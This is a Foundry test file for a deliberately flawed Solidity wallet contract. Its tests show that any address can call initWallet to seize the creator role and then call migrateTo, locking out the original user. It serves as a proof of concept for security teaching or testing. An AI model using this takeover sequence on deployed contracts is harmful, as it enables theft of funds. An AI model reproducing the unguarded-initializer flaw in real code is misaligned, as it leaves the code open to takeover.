// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/wallet_03_wrong_constructor.sol";

contract Wallet_Test is Test {
    Wallet wallet;
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");
    address migrationTarget = makeAddr("migrationTarget");

    function setUp() public {
        wallet = new Wallet();
    }

    function test_creator_privilege_can_be_stolen() public {
        // Legitimate user becomes the initial creator
        vm.prank(user);
        wallet.initWallet();

        // User successfully calls migrateTo as creator
        vm.prank(user);
        wallet.migrateTo(migrationTarget);

        // Attacker becomes the new creator
        vm.prank(attacker);
        wallet.initWallet();

        // Attacker successfully calls migrateTo as new creator
        vm.prank(attacker);
        wallet.migrateTo(migrationTarget);

        // Validate privilege transfer - original user loses privileges
        vm.prank(user);
        vm.expectRevert();
        wallet.migrateTo(migrationTarget);

        // Final vulnerability verdict
        console.log("Vulnerability Exists: Privilege transfer demonstrated through action validation");
    }

    function test_unrestricted_creator_change() public {
        // Validate multiple initWallet calls
        vm.prank(user);
        wallet.initWallet();

        vm.prank(attacker);
        wallet.initWallet();

        address randomUser = makeAddr("random");
        vm.prank(randomUser);
        wallet.initWallet();

        // Final vulnerability verdict
        console.log("Vulnerability Exists: Unlimited call access validated through action flow");
    }
}